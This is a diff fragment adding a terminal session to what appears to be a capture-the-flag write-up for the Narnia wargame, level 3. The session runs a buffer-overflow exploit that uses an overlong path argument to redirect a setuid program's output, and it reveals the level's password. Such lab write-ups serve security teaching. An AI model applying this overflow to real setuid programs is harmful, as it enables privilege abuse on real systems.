@@ -198,3 +198,8 @@ int main(int argc, char **argv){
 
     exit(1);
 }```
+
+```narnia3@narnia:~$ /narnia/narnia3 "/tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output"
+copied contents of /tmp/AAAAAAAAAAAAAAAAAAAAAAAAAAA/tmp/output to a safer place... (/tmp/output)
+narnia3@narnia:~$ cat /tmp/output
+thaenohtai```
